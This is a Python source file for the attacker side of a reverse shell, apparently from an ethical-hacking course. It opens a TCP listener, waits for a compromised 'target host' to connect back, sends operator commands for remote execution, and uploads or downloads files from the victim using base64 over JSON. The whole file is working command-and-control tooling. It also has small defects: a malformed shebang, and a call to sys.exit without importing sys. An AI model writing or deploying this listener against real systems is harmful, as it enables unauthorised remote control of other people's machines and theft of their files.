#!/usr/env/bin python

import socket, json, base64


class Listener:

    # Constructor method
    def __init__(self, localIP, localPort):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
                            1)  # enable option to reuse sockets in case connection drops to reconnect
        listener.bind((localIP, localPort))  # expects a tuple () | create listener on local host
        listener.listen(0)  # how many backlogged connections can this server listener handle
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection " + str(address))

    # Serialize as JSON and send
    def reliableSend(self, data):
        jsonData = json.dumps(data)
        # self.connection.send(jsonData)  # py2
        self.connection.send(jsonData.encode())  # py3

    # Deserialize data and return
    def reliableReceive(self):
        # jsonData = ""  # create an empty string | py2
        jsonData = b""  # create an empty byte string | py3
        while True:  # create infinite loop to collect all data from the TCP stream in the pipe
            try:  # check to see if all data has been collected and JSON deserialization can occur
                jsonData = jsonData + self.connection.recv(
                    1024)  # update the empty string with 1024 bytes of data plus whatever already is in the jsonData var
                return json.loads(jsonData)
            except ValueError:  # if error occurs continue to collect data from stream until fully collected
                continue

    # Execute commands on remote machine
    def executeRemotely(self, command):
        self.reliableSend(command)  # send command to target host
        if command[0] == "exit":
            self.connection.close()
            sys.exit()
        return self.reliableReceive()  # get result from target host

    # Create copy file from target host
    @staticmethod
    def writeFile(path, content):  # take the bytes from read file on target and write it to new file
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))  # decoded base64 before writing to disk
            return "[+] Downloaded Successfully"
    @staticmethod
    def readFile(path):
        with open(path, 'rb') as file:  # read the file bytes for the file to be pushed to target host
            return base64.b64encode(file.read())  # encode it in base64 to prevent unknown character errors

    # Start up the listener
    def startListener(self):
        while True:
            # command = raw_input(">> ")  # py2 user input
            command = input(">> ")  # py3 user input
            command = command.split(" ")  # split string into list by spaces

            try:  # keep socket connection alive and check to see if there was an error
                if command[0] == "upload":
                    getFileContent = self.readFile(command[1])  # get the base64 encoded data from method
                    command.append(str(getFileContent))  # append the base64 encoded data to the command list as 3rd element

                result = self.executeRemotely(command)

                if command[0] == "download" and "[-] Error" not in result:
                    result = self.writeFile(command[1], result)
            except Exception:
                result = "[-] Error during command execution"
            print(result)
